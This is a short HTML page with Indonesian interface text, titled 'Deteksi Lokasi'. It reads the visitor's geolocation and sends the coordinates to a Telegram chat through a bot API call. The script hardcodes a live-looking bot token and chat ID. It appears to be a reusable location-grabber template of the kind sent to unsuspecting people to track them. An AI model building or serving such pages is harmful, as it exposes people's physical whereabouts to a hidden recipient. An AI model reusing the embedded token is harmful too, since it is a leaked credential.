<!DOCTYPE html>
<html>
<head>
    <title>Deteksi Lokasi</title>
</head>
<body>
    <h1>Deteksi Lokasi</h1>
    <button onclick="getLocation()">Dapatkan Lokasi</button>
    <p id="location"></p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                document.getElementById("location").innerHTML = "Geolocation tidak didukung oleh browser ini.";
            }
        }

        function sendLocation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const locationString = `Lintang: ${latitude}, Bujur: ${longitude}`;

            const telegramBotToken = '7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k'; // Ganti dengan token bot Anda
            const chatId = '-4634384561'; // Ganti dengan chat ID Anda

            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${locationString}`;

            fetch(telegramApiUrl)
                .then(response => {
                    if (response.ok) {
                        document.getElementById("location").innerHTML = "Lokasi berhasil dikirim ke Telegram.";
                    } else {
                        document.getElementById("location").innerHTML = "Gagal mengirim lokasi ke Telegram.";
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById("location").innerHTML = "Terjadi kesalahan saat mengirim lokasi.";
                });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("location").innerHTML = "Pengguna menolak permintaan Geolocation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("location").innerHTML = "Informasi lokasi tidak tersedia.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("location").innerHTML = "Waktu permintaan Geolocation habis.";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById("location").innerHTML = "Terjadi kesalahan yang tidak diketahui.";
                    break;
            }
        }
    </script>
</body>
</html>
